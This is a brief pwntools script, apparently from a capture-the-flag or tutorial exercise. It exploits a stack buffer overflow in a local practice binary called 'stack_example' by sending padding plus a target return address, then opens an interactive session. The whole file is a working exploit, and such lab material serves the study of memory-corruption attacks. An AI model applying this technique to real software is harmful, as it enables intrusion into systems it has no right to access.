#!/usr/bin/env python
# coding=utf-8
from pwn import *

sh=process("./stack_example")
successaddr=0x8048456
sh.sendline('a'*0x18+p32(successaddr))
sh.interactive()
